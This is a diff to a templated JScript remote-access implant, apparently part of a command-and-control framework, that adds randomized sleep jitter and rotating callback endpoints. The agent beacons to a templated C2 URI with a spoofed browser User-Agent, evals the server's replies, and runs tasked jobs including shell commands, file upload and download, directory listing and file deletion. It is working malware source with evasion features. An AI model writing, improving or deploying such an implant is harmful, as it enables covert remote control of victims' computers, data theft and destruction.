@@ -1,12 +1,17 @@
 var errors = 0;
 var wscriptshell = new ActiveXObject("WScript.Shell");
-var response = '[["{{ check_in_job_id }}"]]';
+var job_req = '[["{{ key }}"]]';
+var check_in_job_id = '';
 var sleep = {{ sleep }};
+var jitter = {{ jitter }};
+var delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
+var endpoints = {{ endpoints }};
+
 
 function post(data){
   try {
     var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
-    winhttp.Open('Post', '{{ check_in_uri }}');
+    winhttp.Open('Post', '{{ check_in_uri }}' + endpoints[Math.round(Math.random() * (endpoints.length - 1))] );
     winhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
     winhttp.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
     winhttp.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
@@ -21,30 +26,35 @@ function post(data){
   }
 }
 
-{% include "/jscript/functions/base64.js" %}
-{% include "/jscript/functions/delfile.js" %}
-{% include "/jscript/functions/dir.js" %}
-{% include  "/jscript/functions/download.js" %}
-{% include "/jscript/functions/upload.js" %}
-{% include "/jscript/functions/cmd.js" %}
+{% include "functions/base64.js" %}
+{% include "functions/delfile.js" %}
+{% include "functions/dir.js" %}
+{% include  "functions/download.js" %}
+{% include "functions/upload.js" %}
+{% include "functions/cmd.js" %}
+
 
 while (true) {
   try {
-      eval("json_object=" + post(response).responseText + ";");
+      eval("json_object=" + post(job_req).responseText + ";");
   } catch (e) {
-      var response = '[["{{ check_in_job_id }}"]]';
-      WScript.Sleep(sleep);
+      job_req = '[["' + check_in_job_id + '"]]';;
+      WScript.Sleep(((sleep - (sleep * jitter)) + Math.random() * ((sleep * jitter) * 2)) * 1000);
       continue;
   }
   try {
-      response = '[';
-      jobs = json_object.job_packet
+      job_req = '[';
+      jobs = json_object.job_rep
       for (var job in jobs) {
           var id = jobs[job].id
           var name = jobs[job].name
           var args = jobs[job].arguments.toString().split(',');
-          try{
+          try {
               var results = '';
+              if ('check_in' == name){
+                  check_in_job_id = id;
+                  break;
+              }
               if ('upload' === name) {
                   results = upload(b64d(args[0], "bin"), b64d(args[1]));
               }
@@ -75,18 +85,26 @@ while (true) {
               if ('delfile' === name) {
                   results = delfile(b64d(args[0]));
               }
-              if ('sleep' === name) {
-                  sleep = b64d(args[0]);
-                  results = b64e('Sleep change to ' + sleep + ' milliseconds');
+              if ('get delay' === name) {
+                  delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
+                  results = b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + ' %');
               }
-              response = response + '["' + id + '","' +  results + '"],';
+              if('set jitter' === name){
+                  jitter = b64d(args[0]);
+                  results = b64e('Changed jitter to ' + jitter + ' %');
+              }
+              if('set sleep' === name){
+                  sleep = b64d(args[0]);
+                  results = b64e('Changed sleep to ' + sleep + ' second(s)');
+              }
+              job_req = job_req + '["' + id + '","' +  results + '"],';
           } catch (e) {
-             response = response + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
+             job_req = job_req + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
           }
       }
   } catch (e) {
       // caught for reliability
   }
-  response = response + '["{{ check_in_job_id }}"]]';
-  WScript.Sleep(sleep);
+  job_req = job_req + '["' + check_in_job_id + '"]]';
+  WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
 }
